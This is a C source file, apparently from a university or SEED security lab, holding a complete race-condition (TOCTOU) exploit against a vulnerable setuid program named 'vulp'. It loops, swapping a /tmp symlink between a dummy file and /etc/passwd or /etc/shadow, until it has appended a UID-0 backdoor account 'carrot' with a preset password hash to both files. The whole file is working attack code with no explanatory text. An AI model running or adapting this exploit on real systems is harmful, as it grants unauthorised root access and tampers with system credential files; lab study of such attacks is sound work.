/* race.c  */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

#define LINK "/tmp/XYZ"
#define DUMMY "/home/seed/Documents/ssof/lab2/dummy"

void race ( char *filename, char *command ) {

	struct stat st;
	int inicial_size, final_size, counter = 1;

	stat( filename, &st );
	inicial_size = st.st_size;

	while ( 1 ) {

		/* Prepare link */
		unlink( LINK );
		symlink( DUMMY, LINK );

		if( fork() == 0 ) {
			system( command );
			exit( EXIT_SUCCESS );
		}

		/* Wait for program */
		/* usleep( 1 ); */

		/* Race-condition */
		unlink( LINK );
		symlink( filename, LINK );

		/* Print records */
		stat( filename, &st );
		final_size = st.st_size;
		if ( final_size > inicial_size ) {
			printf( "\nChanged %s\n", filename );
			return;
		}

		printf("\rAttempt: %d\r", counter++);

	}

}

int main ( int argc, char** argv ) {

	unlink( "/tmp/race_passwd" );
	unlink( "/tmp/race_shadow" );
	FILE *passwd_file = fopen( "/tmp/race_passwd", "w" ),
             *shadow_file = fopen( "/tmp/race_shadow", "w" );
	fprintf(passwd_file, "carrot:x:0:0:carrot:/root:/bin/bash");
	fprintf(shadow_file, "carrot:$1$312$wvJjqn48qHEp.DhR./47R/:::::::");
	fclose(passwd_file);
	fclose(shadow_file);

	race( "/etc/passwd", "./vulp < /tmp/race_passwd > /dev/null" );
	race( "/etc/shadow", "./vulp < /tmp/race_shadow > /dev/null" );

	/* End process successfully */
	exit( EXIT_SUCCESS );

}
